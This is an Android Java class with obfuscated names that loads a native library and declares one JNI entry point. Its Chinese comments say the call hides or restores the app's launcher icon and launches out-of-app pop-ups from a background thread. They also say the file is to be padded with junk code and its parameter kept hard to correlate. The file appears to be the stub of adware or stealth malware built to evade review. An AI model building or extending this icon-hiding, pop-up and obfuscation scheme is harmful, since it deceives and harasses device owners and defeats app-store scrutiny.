package com.byLQVcZ.YjprUUji;

import android.content.Context;

import androidx.annotation.Keep;

///注意:这个文件大家可以多加一些JNI函数和垃圾代码
public class rzgxDdj {

    static {
        try {
            System.loadLibrary("wdbhuo");
        } catch (Exception e) {
            minid(null, 1);
        }
    }

    private static void minid(Context context, int i) {
        xdminid(context);
        miffnid();
    }

    private static void xdminid(Context context) {
    }

    private static void miffnid() {
    }

    public static native int iWLUKwwa(Context context, int i);//i%20等于12隐藏图标,i%20等于13恢复隐藏.i%20等于15外弹(外弹在子线程调用).(保证i参数不容易关联)

}
